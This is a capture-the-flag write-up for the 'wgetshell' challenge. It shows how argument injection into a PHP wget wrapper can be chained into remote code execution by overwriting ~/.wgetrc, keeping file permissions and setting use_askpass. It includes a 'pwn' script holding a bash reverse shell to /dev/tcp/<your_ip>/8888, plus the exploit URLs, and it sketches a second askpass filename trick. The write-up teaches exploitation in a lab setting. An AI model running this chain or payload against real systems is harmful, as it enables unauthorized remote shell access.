# wgetshell

## Solution

[Example exploit](exploit.py)

The goal of this challenge is to get shell on the server.

There's no command injection vulnerability but only argument injection with only one controllable parameter, how can we do that?

Let's take a look at "GNU Wget 1.21.1-dirty Manual":
https://www.gnu.org/software/wget/manual/wget.html

According to the doc, there is a `--use-askpass=command` option that make wget execute an external executable binary/script to ask password. So the main idea is to find out a way to control this option.

### Step 1: Arbitrary file write (write to ~/.wgetrc)

If the `~/.wgetrc` exists, wget would automatically load this file and the options written in the file would affect the behavior of wget.

This would be useful for exploiting.

To achieve "arbitrary file write", just using `--config=./wgetrc` option. The exploit would download `ftp://<your_ip>/wgetrc2` to `~/.wgetrc`.

**wgetrc1**
```
input=urls1.txt
output_document=~/.wgetrc
```

**urls1.txt**
```
ftp://<your_ip>/wgetrc2
```

**exploit**
```
http://<challenge_ip>/wget.php?url=ftp://<your_ip>/wgetrc1
http://<challenge_ip>/wget.php?url=ftp://<your_ip>/urls1.txt
http://<challenge_ip>/wget.php?url=--config=wgetrc1
```

### Step 2: Download executable binary/script

There is a `--preserve-permission` option that make wget preserve the permission that set up on ftp server to local downloaded file.

**wgetrc2**
```
input=urls2.txt
```

**urls2.txt**
```
ftp://<your_ip>/pwn
```

**pwn**
```
#!/bin/bash
bash -c "bash -i < /dev/tcp/<your_ip>/8888 1<&0 2<&0"
```

**exploit**
```
http://<challenge_ip>/wget.php?url=ftp://<your_ip>/urls2.txt
http://<challenge_ip>/wget.php?url=--preserve-permission
```

### Step 3: Arbitrary file write (overwrite ~/.wgetrc to set use_askpass)

After step 2, we have created a "pwn" file with x permissioin, it's time to set use_askpass in `~/.wgetrc`.

You can use the same method as step 1 to arbitrary overwrite the file.

**wgetrc3**
```
input=urls3.txt
output_document=~/.wgetrc
```

**urls3.txt**
```
ftp://<your_ip>/wgetrc4
```

**wgetrc4**
```
use_askpass=./pwn
```

**exploit**
```
http://<challenge_ip>/wget.php?url=ftp://<your_ip>/wgetrc3
http://<challenge_ip>/wget.php?url=ftp://<your_ip>/urls3.txt
http://<challenge_ip>/wget.php?url=--config=wgetrc3
```

### Step 4: Get shell

Finally, we can execute `./pwn` by calling wget to download any url.

**exploit**
```
http://<challenge_ip>/wget.php?url=0
```


## Another Solution

This method was used by `freefa1111` team who got first blood on this challenge.

If you try to run wget with `wget http://example --use-askpass=/bin/sh` command, there is an intersting error message showed up.

```
$ wget http://example --use-askpass=/bin/sh
/bin/sh: 0: Can't open Username for 'http://example':
Error reading response from command "/bin/sh Username for 'http://example': ": Success
```

From the message, we can see the `Username for 'http://example': ` string is treated as first argument to be passed to /bin/sh. So if we make a file on the path: `Username for 'http:/example': `, the sh would happily execute it for us.

And yes, we definitely can create the file by constructing a wgetrc.

I didn't write the exploit with this solution, so try it for yourself :D

